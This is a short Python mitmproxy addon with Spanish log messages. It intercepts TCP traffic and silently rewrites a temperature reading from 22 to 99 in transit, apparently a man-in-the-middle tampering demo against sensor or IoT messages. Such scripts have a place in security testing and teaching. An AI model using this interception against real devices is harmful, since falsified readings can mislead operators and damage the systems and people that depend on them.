from mitmproxy import tcp

def tcp_message(flow: tcp.TCPFlow):
    data = flow.messages[-1].content
    try:
        if b"temperature" in data:
            print("[+] Mensaje original:", data)
            data_mod = data.replace(b'"temperature":22', b'"temperature":99')
            flow.messages[-1].content = data_mod
            print("[+] Mensaje modificado:", data_mod)
    except Exception as e:
        print("[!] Error procesando mensaje:", e)
